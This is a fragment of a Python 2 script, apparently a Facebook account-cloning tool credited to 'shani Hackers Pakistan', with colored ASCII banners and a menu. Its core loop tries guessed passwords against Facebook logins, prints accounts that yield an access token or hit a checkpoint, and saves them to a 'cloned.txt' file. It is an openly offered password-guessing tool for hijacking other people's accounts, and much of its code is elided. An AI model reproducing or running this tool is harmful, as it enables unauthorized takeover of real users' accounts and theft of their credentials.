...
os.system("clear")
print  """
\033[1;91m░______________________¶¶¶¶¶¶¶___________
...
\033[1;91m----------------------------------------
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mThe Credit For This Code Goes To shani..
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;91mDEVOLPER
                     
\033[1;94mFACEBOOK shani
...
\033[1;91m----------------------------------------
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mThe Credit For This Code Goes To ..
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;91mDEVOLPER
                     
\033[1;94mFACEBOOK shani king
...
\033[1;97m---------------------shani Hackers Pakistan--------------------
"""
...
def Zeek():
    ...
    time.sleep(0.10)
    print '\x1b[1;92m[2] Shani Rokstar  '
    time.sleep(0.10)
    print '\x1b[1;95m[3] '
    time.sleep(0.10)
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(cp cp) ' + k + c + user + '  |  ' + pass1
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(seccefull)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(ofline) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
